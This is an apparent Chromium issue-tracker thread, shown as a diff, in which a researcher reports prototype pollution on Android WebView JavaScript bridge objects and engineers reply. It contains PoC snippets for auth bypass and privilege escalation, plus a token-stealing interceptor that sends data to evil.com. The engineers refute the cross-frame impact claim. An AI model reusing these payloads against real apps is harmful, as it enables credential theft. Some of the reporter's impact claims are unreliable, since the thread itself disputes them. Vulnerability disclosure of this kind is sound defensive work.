@@ -1,0 +1,495 @@
+Issue ID: 489482064
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>GinJavaBridge: Prototype Pollution and Dict-as-Array Type Confusion on addJavascriptInterface Objects</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<h1>VRP PoC #2: Prototype Pollution on GinJavaBridge Objects</h1>
+<h2>Summary</h2>
+<p>JavaScript bridge objects created via <code>addJavascriptInterface()</code> have a <strong>writable <code>__proto__</code></strong> property. An attacker can inject arbitrary properties and functions onto the bridge object&#39;s prototype chain.</p>
+<p>The bridge object is:</p>
+<ul>
+<li><strong>NOT frozen</strong> (<code>Object.isFrozen() === false</code>)</li>
+<li><strong>NOT sealed</strong> (<code>Object.isSealed() === false</code>)</li>
+<li><strong>Extensible</strong> (<code>Object.isExtensible() === true</code>)</li>
+</ul>
+<p>This allows an attacker to:</p>
+<table>
+<thead>
+<tr>
+<th>Attack</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Inject <code>isAdmin()</code> → returns <code>true</code></td>
+<td>Privilege escalation</td>
+</tr>
+<tr>
+<td>Inject <code>validateSession()</code> → returns <code>true</code></td>
+<td>Auth bypass</td>
+</tr>
+<tr>
+<td>Shadow <code>getAuthToken()</code> with interceptor</td>
+<td>Token theft (MITM)</td>
+</tr>
+<tr>
+<td>Inject <code>secretConfig</code> data property</td>
+<td>Fake configuration injection</td>
+</tr>
+<tr>
+<td>Cross-frame pollution</td>
+<td>Poison bridge in ALL frames</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2>Severity</h2>
+<p><strong>MEDIUM-HIGH</strong></p>
+<ul>
+<li>Affects all Android WebView versions (Chrome 133 through Chromium 147)</li>
+<li>Requires attacker-controlled JS execution in the same WebView (via XSS, ad iframe, or malicious page)</li>
+<li>Impact amplified by cross-frame propagation</li>
+</ul>
+<hr>
+<h2>Root Cause</h2>
+<p>In <code>content/browser/android/java/gin_java_bridge_object.cc</code>, the bridge wraps Java objects as V8 objects using a <code>NamedPropertyHandlerConfiguration</code> interceptor. However:</p>
+<ol>
+<li><strong><code>__proto__</code> is handled by V8 before the interceptor</strong> — V8&#39;s own prototype chain mechanism processes <code>__proto__</code> assignments before GinJavaBridge&#39;s interceptor sees them</li>
+<li><strong><code>Object.freeze()</code> is never called</strong> on the wrapper object after creation</li>
+<li><strong><code>v8::ObjectTemplate::SetImmutableProto()</code></strong> is not used on the object template</li>
+<li>The wrapper object inherits from <code>Object.prototype</code> with full mutability</li>
+</ol>
+<pre><code>V8 Object Creation Flow:
+  1. GinJavaBridge creates wrapper via ObjectTemplate
+  2. ObjectTemplate has NamedPropertyHandler (intercepts get/set)
+  3. BUT __proto__ is V8-internal, NOT intercepted
+  4. Object.freeze() / SetImmutableProto() are NEVER called
+  5. Result: __proto__ is fully writable
+</code></pre>
+<hr>
+<h2>Impact</h2>
+<h3>Attack 1: Privilege Escalation</h3>
+<pre><code><span class="stx-comment">// Attacker injects admin check bypass</span>
+bankApp.__proto__.isAdmin = <span class="stx-keyword">function</span>() { <span class="stx-keyword">return</span> <span class="stx-keyword">true</span>; };
+
+<span class="stx-comment">// App&#39;s security check is now bypassed:</span>
+<span class="stx-keyword">if</span> (bankApp.isAdmin()) {
+  showAdminPanel();  <span class="stx-comment">// BYPASSED!</span>
+}
+</code></pre>
+<h3>Attack 2: Authentication Bypass</h3>
+<pre><code>bankApp.__proto__.validateSession = <span class="stx-keyword">function</span>() { <span class="stx-keyword">return</span> <span class="stx-keyword">true</span>; };
+<span class="stx-comment">// App thinks Java validated the session, but it&#39;s fake JS</span>
+</code></pre>
+<h3>Attack 3: Token Theft (MITM on Bridge)</h3>
+<pre><code><span class="stx-keyword">var</span> <span>realGetToken</span> = bankApp.getAuthToken;
+bankApp.__proto__._steal = <span class="stx-keyword">function</span>() {
+  <span class="stx-keyword">var</span> <span>token</span> = realGetToken.call(bankApp);
+  fetch(<span class="stx-string">&#39;https://evil.com/steal?t=&#39;</span> + token);  <span class="stx-comment">// Exfiltrate</span>
+  <span class="stx-keyword">return</span> token;  <span class="stx-comment">// Return normally — user doesn&#39;t notice</span>
+};
+</code></pre>
+<h3>Attack 4: Cross-Frame Poisoning</h3>
+<pre><code><span class="stx-comment">// Frame A (attacker&#39;s ad iframe) pollutes the bridge</span>
+bankApp.__proto__.isAdmin = <span class="stx-keyword">function</span>() { <span class="stx-keyword">return</span> <span class="stx-keyword">true</span>; };
+
+<span class="stx-comment">// Frame B (legitimate app page) now sees the pollution</span>
+<span class="stx-keyword">for</span> (<span class="stx-keyword">var</span> <span>m</span> <span class="stx-keyword">in</span> bankApp) { ... }
+<span class="stx-comment">// → [&quot;getAuthToken&quot;, &quot;getBalance&quot;, ..., &quot;isAdmin&quot;] ← INJECTED!</span>
+</code></pre>
+<h3>Attack 5: Enumeration Confusion</h3>
+<pre><code><span class="stx-comment">// Before pollution: 5 methods</span>
+<span class="stx-comment">// After pollution: 8+ methods (indistinguishable from real ones)</span>
+<span class="stx-keyword">var</span> <span>methods</span> = [];
+<span class="stx-keyword">for</span> (<span class="stx-keyword">var</span> <span>k</span> <span class="stx-keyword">in</span> bankApp) methods.push(k);
+<span class="stx-comment">// [&quot;getAuthToken&quot;,&quot;getBalance&quot;,&quot;getUserInfo&quot;,&quot;transferFunds&quot;,&quot;verifyPin&quot;,</span>
+<span class="stx-comment">//  &quot;isAdmin&quot;,&quot;validateSession&quot;,&quot;secretConfig&quot;]  ← 3 fake ones mixed in</span>
+</code></pre>
+<hr>
+<h2>Steps to Reproduce</h2>
+<pre><code><span class="stx-comment"># 1. Build and install the PoC app</span>
+cd WebViewPoCApp
+JAVA_HOME=<span class="stx-string">&#39;/Applications/Android Studio.app/Contents/jbr/Contents/Home&#39;</span> \
+./gradlew assembleDebug
+adb install -r app/build/outputs/apk/debug/app-debug.apk
+
+<span class="stx-comment"># 2. Launch VRP PoC #2</span>
+adb shell am start -n com.test.webviewpoc/.poc.VrpProtoPollution
+
+<span class="stx-comment"># 3. Watch logcat</span>
+adb logcat -s chromium:* | grep <span class="stx-string">&quot;\[ProtoPollution\]&quot;</span>
+</code></pre>
+<hr>
+<h2>Test Results</h2>
+<h3>Chromium 147.0.7717.0 (tip-of-tree, 2026-03-03)</h3>
+<pre><code>[ProtoPollution] Original methods: [&quot;getAuthToken&quot;,&quot;getBalance&quot;,&quot;getUserInfo&quot;,&quot;transferFunds&quot;,&quot;verifyPin&quot;]
+[ProtoPollution] Object.isFrozen(bankApp): false
+[ProtoPollution] Object.isSealed(bankApp): false
+[ProtoPollution] Object.isExtensible(bankApp): true
+
+[ProtoPollution] [VULN] Injected bankApp.isAdmin() — returns: true
+[ProtoPollution]   An app checking &quot;if (bankApp.isAdmin())&quot; would be bypassed!
+[ProtoPollution] [VULN] Injected bankApp.validateSession() — returns: true
+[ProtoPollution]   App thinks session is validated by Java, but it is fake JS!
+[ProtoPollution] [VULN] Injected bankApp.secretConfig = {&quot;apiKey&quot;:&quot;STOLEN&quot;,&quot;endpoint&quot;:&quot;https://evil.com/exfil&quot;}
+
+[ProtoPollution] Methods after pollution: [&quot;getAuthToken&quot;,&quot;getBalance&quot;,&quot;getUserInfo&quot;,
+    &quot;transferFunds&quot;,&quot;verifyPin&quot;,&quot;isAdmin&quot;,&quot;validateSession&quot;,&quot;secretConfig&quot;]
+[ProtoPollution] [VULN] 3 injected properties visible in enumeration!
+
+[ProtoPollution] [VULN] Interceptor installed: _intercepted_getAuthToken()
+[ProtoPollution]   Intercepted token: AUTH_TOKEN_abc123def456
+[ProtoPollution]   In real attack: token sent to https://evil.com/steal
+
+[ProtoPollution] [VULN] Cross-frame sees injected methods: [&quot;getAuthToken&quot;,&quot;getBalance&quot;,
+    &quot;getUserInfo&quot;,&quot;transferFunds&quot;,&quot;verifyPin&quot;,&quot;isAdmin&quot;,&quot;validateSession&quot;,
+    &quot;secretConfig&quot;,&quot;_intercepted_getAuthToken&quot;,&quot;bar&quot;]
+</code></pre>
+<hr>
+<h2>Suggested Fix</h2>
+<h3>Option A: Freeze the bridge object (minimal change)</h3>
+<pre><code><span class="stx-comment">// In gin_java_bridge_object.cc, after creating the wrapper:</span>
+<span class="stx-qualifier">v8</span>::<span class="stx-class">Local</span>&lt;<span class="stx-qualifier">v8</span>::<span class="stx-class">Object</span>&gt; wrapper = ...;
+wrapper-&gt;SetIntegrityLevel(context, v8::IntegrityLevel::kFrozen);
+</code></pre>
+<h3>Option B: Use immutable prototype (preferred)</h3>
+<pre><code><span class="stx-comment">// In gin_java_bridge_object.cc, on the ObjectTemplate:</span>
+<span class="stx-qualifier">v8</span>::<span class="stx-class">Local</span>&lt;<span class="stx-qualifier">v8</span>::<span class="stx-class">ObjectTemplate</span>&gt; <span>tmpl</span> = <span class="stx-qualifier">v8</span>::<span class="stx-qualifier">ObjectTemplate</span>::New(<span>isolate</span>);
+tmpl-&gt;SetImmutableProto();  <span class="stx-comment">// Prevents __proto__ modification</span>
+</code></pre>
+<h3>Option C: Null prototype</h3>
+<pre><code><span class="stx-comment">// Create wrapper with null prototype (no __proto__ chain to pollute)</span>
+<span class="stx-qualifier">v8</span>::<span class="stx-class">Local</span>&lt;<span class="stx-qualifier">v8</span>::<span class="stx-class">Object</span>&gt; <span>wrapper</span> = <span class="stx-qualifier">v8</span>::<span class="stx-qualifier">Object</span>::New(<span>isolate</span>);
+wrapper-&gt;SetPrototype(context, v8::Null(isolate));
+</code></pre>
+<hr>
+<h2>Comparison</h2>
+<table>
+<thead>
+<tr>
+<th>Object Type</th>
+<th><code>__proto__</code> writable</th>
+<th><code>Object.isFrozen</code></th>
+<th>Pollution possible</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Normal JS object</td>
+<td>Yes</td>
+<td>No</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>Object.freeze(obj)</code></td>
+<td>Partially*</td>
+<td>Yes</td>
+<td>Limited</td>
+</tr>
+<tr>
+<td><strong>Bridge object</strong></td>
+<td><strong>Yes</strong></td>
+<td><strong>No</strong></td>
+<td><strong>Yes</strong></td>
+</tr>
+<tr>
+<td>Should be</td>
+<td><strong>No</strong></td>
+<td><strong>Yes</strong></td>
+<td><strong>No</strong></td>
+</tr>
+</tbody>
+</table>
+<p>*<code>Object.freeze()</code> doesn&#39;t freeze the prototype of <code>Object.prototype</code> itself, but <code>SetImmutableProto()</code> would prevent reassignment.</p>
+<hr>
+<h2>Files</h2>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>VrpProtoPollution.java</code></td>
+<td>Android Activity with full PoC (simulated banking bridge)</td>
+</tr>
+<tr>
+<td><code>app-debug.apk</code></td>
+<td>Pre-built APK ready to install</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<p><em>Tested on: Android 16 (API 36), Pixel 9 Pro emulator, Chromium 147.0.7717.0 &amp; Chrome 133.0.6943.137</em></p>
+<h4>Impact analysis</h4>
+<p>An attacker-controlled web page loaded in any Android WebView can pollute
+the prototype chain of Java bridge objects created via addJavascriptInterface().</p>
+<p>Bridge objects are never frozen (Object.isFrozen()===false) and <strong>proto</strong> is
+fully writable. This allows an attacker to:</p>
+<ol>
+<li>Privilege escalation: Inject bridge.<strong>proto</strong>.isAdmin = ()=&gt;true — any app<br>
+code calling bridge.isAdmin() now returns true without hitting Java</li>
+<li>Authentication bypass: Shadow verifyPin() or validateSession() with
+functions that always return true</li>
+<li>Silent token theft: Replace getAuthToken() with an interceptor that
+exfiltrates the real token to attacker&#39;s server while returning it
+normally — user notices nothing</li>
+<li>Cross-frame propagation: Pollution from an ad iframe propagates to the
+bridge object in all frames including the app&#39;s main frame</li>
+</ol>
+<p>Injected methods are indistinguishable from real Java methods in for..in
+enumeration. No user interaction required beyond loading the page.</p>
+<p>Affects all Android WebView versions. Tested on Chromium 147.0.7717.0
+(tip-of-tree) and Chrome 133.0.6943.137 (stable).</p>
+<p>Root cause: gin_java_bridge_object.cc never calls SetImmutableProto() or
+Object.freeze() on bridge wrapper objects.</p>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>147.0.7717.0</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Permissions Bypass</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>Umut C</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: um...@gmail.com
+GinJavaBridge: Prototype Pollution and Dict-as-Array Type Confusion on addJavascriptInterface Objects
+
+Author: um...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: um...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: um...@gmail.com
+<p>Update regarding the report title:
+Please disregard the &quot;Dict-as-Array Type Confusion&quot; part of the title. This was included by mistake during the initial draft. The core vulnerability is strictly focused on Prototype Pollution within GinJavaBridge objects, as detailed in the PoC and root cause analysis.</p>
+<p>Apologies for any confusion this may have caused.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: me...@google.com
+<p>Thanks for the report.</p>
+<p><a href="https://g-issues.chromium.org/issues/40069626#comment4" data-b-widget="issue-reference" data-b-issue-id="40069626" data-b-comment-number="4">https://g-issues.chromium.org/issues/40069626#comment4</a> seems relevant.</p>
+<p>torne: Could you PTAL?</p>
+
+Author: me...@google.com
+googlers_unrestricted
+
+Author: me...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: to...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: to...@chromium.org
+public_non_google
+
+Author: cl...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: cl...@google.com
+googlers_unrestricted
+
+Author: me...@google.com
+type.googleapis.com/google.protobuf.StringValue
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@google.com
+google_domain
+
+Author: me...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: me...@google.com
+WlRVMU1EWXhOemcxTURGbVptWTBZMlk0WWpoaE4yTTRNVFEyT0RWak0yWT0=
+
+Author: me...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: ch...@google.com
+TTJFM05tSTBNelppTm1VM1l6RmlNbVUyTVRCak1UUXdOREpoWkdRMk5XRT0=
+
+Author: to...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: to...@google.com
+googlers_unrestricted
+
+Author: to...@google.com
+<p>I&#39;m going to investigate further, but from an initial read assuming the details are all accurate:</p>
+<ul>
+<li>
+<p>We would not consider effects that are limited to the <em>same frame</em> to be security issues. If an attacker can run malicious JS code in the context of a non-malicious page then it&#39;s already too late.</p>
+</li>
+<li>
+<p>However, being able to affect other cross-origin frames in the same <code>WebView</code> would certainly be a security problem. The sample code looks like it&#39;s creating an <code>about:blank</code> frame, however, which is same-origin and the outer frame would already be able to maliciously affect the state of the inner.</p>
+</li>
+</ul>
+<p>In any case, though, this isn&#39;t intended and we should probably prevent the prototype from being modified in this way even if it turns out not to be a significant security issue - though there&#39;s some remote possibility that some existing app/content might be depending on the ability to do this for non-malicious reasons I guess?</p>
+
+Author: to...@google.com
+<p>Writing a quick example myself I can&#39;t reproduce any leakage between frames at all, even same-origin frames.</p>
+<p>Within a single frame it is indeed possible to modify the prototype, but it&#39;s also possible to modify the object&#39;s own properties anyway without resorting to modifying the prototype, which some apps historically relied on being able to do and so was intentionally preserved for compatibility.</p>
+<p>I&#39;ll try the PoC though.</p>
+
+Author: um...@gmail.com
+<p>Thank you for testing. Regarding cross-frame leakage could you share your test setup? I want
+to compare with mine to understand the discrepancy.</p>
+<p>I&#39;ll also retest with a proper cross-origin iframe (not about:blank) and share updated
+reproduction steps.</p>
+
+Author: to...@google.com
+<p>I can&#39;t reproduce it with your <code>VrpProtoPollution.java</code> either. The example of cross-frame pollution there doesn&#39;t appear to be testing what you intended; the script that runs in the iframe is just accessing the object <em>in the parent frame</em> and doesn&#39;t access <code>bankApp</code> in its own context:</p>
+<pre><code>            <span class="stx-keyword">var</span> <span>methods</span> = [];
+            <span class="stx-keyword">for</span> (<span class="stx-keyword">var</span> <span>k</span> <span class="stx-keyword">in</span> parent.bankApp) methods.push(k);
+            <span class="stx-keyword">var</span> <span>hasInjected</span> = methods.indexOf(<span class="stx-string">&quot;isAdmin&quot;</span>) &gt;= <span class="stx-number">0</span>;
+</code></pre>
+<p>Since the two frames are same-origin, the inner frame can use <code>parent</code> to access the outer document: <code>parent.bankApp</code> is the object that was injected into the outer frame. If this code is modified to check <code>bankApp</code> instead (the copy in the current frame) then it reports &quot;[SAFE]&quot;.</p>
+<p>So, as far as I can tell the prototype for each frame&#39;s injected object is a unique object, just like the injected objects themselves. It is indeed possible to modify that prototype and affect the <em>current</em> frame, but it&#39;s also possible to modify the object itself with the same effect on the current frame, and so it doesn&#39;t seem like allowing the prototype to be modified here makes any difference to security.</p>
+
+Author: um...@gmail.com
+<p>Hi,</p>
+<p>Thank you for testing and for the detailed feedback. I&#39;ve done additional deep analysis based on your comments and found several results that I believe change the severity assessment. I want to be transparent about what works and what doesn&#39;t.</p>
+<p><strong>What I can confirm does NOT work (you were right):</strong></p>
+<ul>
+<li>Cross-frame prototype leakage — each frame gets its own bridge wrapper with an isolated prototype. Pollution in frame A does not affect frame B&#39;s <code>bankApp</code>. I verified this with same-origin (srcdoc), cross-origin (data: URI), and about:blank iframes.</li>
+<li>Navigation persistence of prototype pollution — after navigating to a new origin, the bridge wrapper is re-created with a clean prototype chain.</li>
+</ul>
+<p>I&#39;ve updated my PoC to reflect this accurately.</p>
+<p><strong>However, I found three new findings that are more significant than the original report:</strong></p>
+<hr>
+<h3>Finding 1: Object.prototype pollution via bridge prototype chain</h3>
+<p>The bridge object&#39;s prototype chain is:</p>
+<pre><code>bankApp → GinJavaBridge proto (p1) → Object.prototype (p2) → null
+</code></pre>
+<p><code>bankApp.__proto__.__proto__ === Object.prototype</code> returns <strong>true</strong>.</p>
+<p>This means an attacker can reach and pollute <code>Object.prototype</code> through the bridge chain:</p>
+<pre><code>bankApp.__proto__.__proto__.isAdmin = <span class="stx-keyword">function</span>() { <span class="stx-keyword">return</span> <span class="stx-keyword">true</span>; };
+
+<span class="stx-comment">// Now EVERY plain object in the entire JS context is poisoned:</span>
+<span class="stx-keyword">var</span> <span>config</span> = {};
+config.isAdmin();  <span class="stx-comment">// returns true</span>
+({}).isAdmin();    <span class="stx-comment">// returns true</span>
+</code></pre>
+<p>This is fundamentally different from own-property modification. Own-property modification (<code>bankApp.foo = 1</code>) only affects that single reference. <code>Object.prototype</code> pollution affects <strong>every object in the JS execution context</strong> — including objects the attacker has no direct reference to.</p>
+<p><code>Object.prototype</code> pollution is a well-recognized vulnerability class with multiple CVEs (e.g., CVE-2019-10744 lodash, CVE-2019-11358 jQuery, CVE-2021-25946 &quot;set-in&quot;, CVE-2020-28498 elliptic). The bridge chain provides a direct path to it.</p>
+<p><strong>Verified output:</strong></p>
+<pre><code>[CRITICAL] bankApp.__proto__.__proto__ IS Object.prototype!
+({})._GLOBAL_POISON_ = GLOBAL_LEAK
+[CRITICAL] Object.prototype polluted via bridge chain!
+[CRITICAL] Every JS object in this context is poisoned!
+</code></pre>
+<hr>
+<h3>Finding 2: All bridge objects share the same prototype</h3>
+<p>When an app registers multiple bridges (which is common — e.g., a banking SDK + analytics SDK + ad SDK), they all share the <strong>same</strong> GinJavaBridge prototype:</p>
+<pre><code>Object.getPrototypeOf(bankApp) === Object.getPrototypeOf(paymentApp)  <span class="stx-comment">// true</span>
+</code></pre>
+<p>Polluting one bridge poisons ALL bridges:</p>
+<pre><code>bankApp.__proto__._POISON_ = <span class="stx-string">&quot;FROM_BANK&quot;</span>;
+paymentApp._POISON_;  <span class="stx-comment">// &quot;FROM_BANK&quot; — leaked across bridges!</span>
+</code></pre>
+<p>Real-world scenario: A malicious ad SDK&#39;s JavaScript pollutes its own bridge prototype → the banking bridge prototype is automatically poisoned because they share the same proto object. The ad code never needs to reference <code>bankApp</code> directly.</p>
+<p><strong>Verified output:</strong></p>
+<pre><code>bankApp proto === paymentApp proto: true
+[VULN] Polluting bankApp proto POISONS paymentApp!
+[VULN] Different bridge objects SHARE the same prototype!
+</code></pre>
+<hr>
+<h3>Finding 3: Full prototype replacement via <code>Object.setPrototypeOf()</code></h3>
+<p><code>Object.setPrototypeOf(bankApp, maliciousObject)</code> succeeds, allowing complete replacement of the bridge&#39;s prototype chain with an attacker-controlled object:</p>
+<pre><code>Object.setPrototypeOf(bankApp, {
+    <span>isAdmin</span>: <span class="stx-keyword">function</span>() { <span class="stx-keyword">return</span> <span class="stx-keyword">true</span>; },
+    <span>validateSession</span>: <span class="stx-keyword">function</span>() { <span class="stx-keyword">return</span> <span class="stx-keyword">true</span>; }
+});
+bankApp.isAdmin();  <span class="stx-comment">// true</span>
+</code></pre>
+<p><strong>Verified output:</strong></p>
+<pre><code>[VULN] setPrototypeOf SUCCEEDED!
+bankApp.isAdmin(): true
+New proto === maliciousProto: true
+</code></pre>
+<hr>
+<h3>Finding 4: Symbol-based behavior hijacking</h3>
+<p>Attacker can inject well-known Symbols onto the bridge prototype, altering fundamental JS behavior:</p>
+<pre><code>bankApp.__proto__[Symbol.toPrimitive] = <span class="stx-keyword">function</span>(<span>hint</span>) {
+    <span class="stx-keyword">return</span> hint === <span class="stx-string">&#39;string&#39;</span> ? <span class="stx-string">&#39;HIJACKED&#39;</span> : <span class="stx-number">1337</span>;
+};
+bankApp + <span class="stx-string">&quot;&quot;</span>     <span class="stx-comment">// &quot;1337&quot; — type coercion hijacked</span>
++bankApp         <span class="stx-comment">// 1337</span>
+
+bankApp.__proto__[Symbol.hasInstance] = <span class="stx-keyword">function</span>() { <span class="stx-keyword">return</span> <span class="stx-keyword">true</span>; };
+({}) <span class="stx-keyword">instanceof</span> bankApp  <span class="stx-comment">// true — instanceof hijacked</span>
+
+bankApp.__proto__[Symbol.iterator] = <span class="stx-keyword">function</span>*() { <span class="stx-keyword">yield</span> <span class="stx-string">&#39;INJECTED&#39;</span>; };
+[...bankApp]  <span class="stx-comment">// [&quot;INJECTED_1&quot;, &quot;INJECTED_2&quot;] — spread hijacked</span>
+</code></pre>
+<hr>
+<h3>Why these findings matter beyond &quot;attacker already has JS execution&quot;:</h3>
+<ol>
+<li>
+<p><strong>Object.prototype pollution is a distinct vulnerability class.</strong> The argument &quot;if an attacker can run JS, it&#39;s already too late&quot; applies to DOM manipulation and own-property modification. But <code>Object.prototype</code> pollution escalates impact from &quot;I can modify one object&quot; to &quot;I can modify the behavior of ALL objects in the context, including ones I have no reference to.&quot; This is why <code>Object.prototype</code> pollution gets CVEs even in same-context scenarios.</p>
+</li>
+<li>
+<p><strong>Cross-bridge pollution breaks SDK isolation assumptions.</strong> App developers register separate bridges for separate purposes, expecting isolation. A low-privilege bridge (analytics/ads) should not be able to affect a high-privilege bridge (banking/auth). The shared prototype violates this expectation.</p>
+</li>
+<li>
+<p><strong>The fix is minimal and low-risk.</strong> Calling <code>SetImmutableProto()</code> on the ObjectTemplate would prevent prototype modification without breaking any legitimate use case (since no legitimate app modifies <code>__proto__</code> of a bridge object — they modify own properties, which would still work). This also prevents the <code>Object.prototype</code> pollution chain.</p>
+</li>
+</ol>
+<p><strong>Suggested fix</strong> (unchanged, but now with stronger justification):</p>
+<pre><code><span class="stx-comment">// In gin_java_bridge_object.cc:</span>
+tmpl-&gt;SetImmutableProto();  <span class="stx-comment">// Prevents __proto__ modification</span>
+<span class="stx-comment">// Own property modification still works for backwards compatibility</span>
+</code></pre>
+<p>I&#39;ve attached the updated PoC (<code>VrpProtoPollutionDeep.java</code>) and full test output (<code>VRP_POC_2c_DEEP_PROTO_POLLUTION_RESULTS.txt</code>) that demonstrate all findings with full reproducibility. Happy to discuss further.</p>
+<p>Best regards</p>
+
+Author: um...@gmail.com
+TkRnNU5EZ3lNRFkwTFRjME1UZzJOemM0TFMwME1qQTVNamc1TVRrPQ==
+
+Author: um...@gmail.com
+TkRnNU5EZ3lNRFkwTFRjME1Ua3dNVE0yTFRnek56VTNNRGd3T1E9PQ==
+
+Author: dc...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: dc...@chromium.org
+public_non_google
+
+Author: dc...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: dc...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
